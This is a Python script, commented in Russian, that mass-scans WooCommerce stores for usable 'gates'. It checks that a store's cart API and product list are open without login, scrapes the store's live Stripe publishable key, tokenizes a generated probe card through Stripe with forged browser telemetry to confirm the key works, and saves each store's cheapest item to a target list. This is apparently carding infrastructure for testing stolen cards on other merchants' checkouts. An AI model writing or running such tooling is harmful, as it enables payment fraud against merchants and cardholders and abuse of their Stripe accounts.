# language: Python 3.12+, file: scratch/_scan_store_gates.py
# Квалификатор Woo Store API (Blocks) поверхности: домены без открытой регистрации
# всё равно могут быть живыми гейтами — корзина + pk_live + бесплатная токенизация.
# Пишет: data/store_gates.json (полные профили) + data/store_targets.txt + domains.db.
import asyncio
import json
import os
import sys
import time

from curl_cffi.requests import AsyncSession

import gate_client as gc
import domains_store

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

OUT_GATES = os.path.join("data", "store_gates.json")
OUT_TARGETS = os.path.join("data", "store_targets.txt")


def load_existing_gates() -> list[dict]:
    if os.path.exists(OUT_GATES):
        try:
            with open(OUT_GATES, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                return data
        except Exception:
            pass
    return []


async def probe_store_surface(domain: str, sem: asyncio.Semaphore) -> dict | None:
    """Один домен: cart-nonce -> pk_live -> бесплатная токенизация probe-картой.
    None = поверхность мертва; dict со status=STORE_LIVE = квалифицирован."""
    base = f"https://{domain}"
    api = f"{base}/wp-json/wc/store/v1"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                # 1) Blocks Store API жив? (200 + Nonce header)
                r_cart = await s.get(f"{api}/cart", timeout=8)
                if r_cart.status_code != 200:
                    return None
                nonce = r_cart.headers.get("nonce", "")
                if not nonce:
                    return None

                # 2) товары видимы без авторизации?
                try:
                    r_prod = await s.get(f"{api}/products",
                                         params={"per_page": 5},
                                         headers={"Nonce": nonce}, timeout=8)
                    items = r_prod.json()
                except Exception:
                    return None
                if not isinstance(items, list) or not items:
                    return None

                # 3) pk_live на витрине
                pk = ""
                for path in ("/checkout/", "/checkout", "/shop/", "/"):
                    try:
                        r0 = await s.get(base + path, timeout=10)
                        pk = gc.extract_pk_live(r0.text)
                    except Exception:
                        continue
                    if pk:
                        break
                if not pk:
                    return None

                # 4) бесплатная токенизация probe-картой — ключ жив?
                telem = gc.stripe_telemetry(base, pk)
                probe = gc.gen_probe_card()
                r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                                     data=gc.tokenize_body(probe, telem, base),
                                     headers=gc.TOKENIZE_HEADERS, timeout=8)
                try:
                    tok = r_tok.json()
                except Exception:
                    return None
                if "id" not in tok:
                    return {"domain": domain, "status": "STORE_KEY_DEAD",
                            "detail": str(tok.get("error", {}).get("code", ""))[:80]}

                cheapest = None
                try:
                    for p in items:
                        pr = int(p.get("prices", {}).get("price") or 0)
                        if pr > 0:
                            cheapest = min(cheapest or (pr, p["id"]), (pr, p["id"]))
                except Exception:
                    pass

                return {
                    "domain": domain,
                    "base_url": base,
                    "pk_live": pk,
                    "gate_type": "woo_store_api",
                    "store_nonce": bool(nonce),
                    "cheapest_cents": cheapest[0] if cheapest else None,
                    "updated_at": int(time.time()),
                    "status": "STORE_LIVE",
                }
        except Exception:
            return None
    return None


async def main():
    print("=" * 80)
    print("[*] STORE-API SURFACE SCANNER (Blocks cart + pk_live + free tokenize probe)")
    print("=" * 80)

    domains_store.init_db()
    rows = domains_store.all_domains()
    # пропускаем уже квалифицированные под setup-вектор — их трогает основной сканер
    todo = [r["domain"] for r in rows if r["scan_result"] not in ("READY",)]
    print(f"[*] Domains in db: {len(rows)} | to probe (non-READY): {len(todo)}")

    existing = load_existing_gates()
    known = {g["domain"] for g in existing}
    todo = [d for d in todo if d not in known]
    print(f"[*] After dedup vs store_gates.json ({len(known)} known): {len(todo)} fresh")

    sem = asyncio.Semaphore(30)
    t0 = time.time()
    live, dead = [], 0
    done = 0
    BATCH = 60
    for i in range(0, len(todo), BATCH):
        batch = todo[i:i + BATCH]
        results = await asyncio.gather(*[probe_store_surface(d, sem) for d in batch])
        for r in results:
            if r is None:
                dead += 1
            elif r.get("status") == "STORE_LIVE":
                live.append(r)
            # STORE_KEY_DEAD — тоже результат, но не гейт
        done += len(batch)
        print(f"  [{done}/{len(todo)}] live={len(live)} dead={dead} "
              f"({time.time() - t0:.0f}s)", flush=True)

    # writeback в domains.db
    for r in live:
        domains_store.mark_scanned(r["domain"], "STORE_LIVE")

    # мердж с существующими записями (свежие данные побеждают)
    by_domain = {g["domain"]: g for g in existing}
    for r in live:
        by_domain[r["domain"]] = r
    final = list(by_domain.values())

    os.makedirs("data", exist_ok=True)
    with open(OUT_GATES, "w", encoding="utf-8") as f:
        json.dump(final, f, indent=2)
    with open(OUT_TARGETS, "w", encoding="utf-8") as f:
        for g in final:
            f.write(g["base_url"] + "\n")

    print("\n" + "=" * 80)
    print(f"[🔥] STORE-API LIVE GATES: {len(final)} (new this run: {len(live)})")
    print("=" * 80)
    for g in final:
        pk_disp = g.get("pk_live", "")[:24] + "..." if g.get("pk_live") else "N/A"
        cheap = g.get("cheapest_cents")
        cheap_s = f"{cheap}c" if cheap is not None else "?"
        print(f"  [STORE_LIVE] {g['domain']:36} | PK: {pk_disp} | cheapest: {cheap_s}")


if __name__ == "__main__":
    asyncio.run(main())
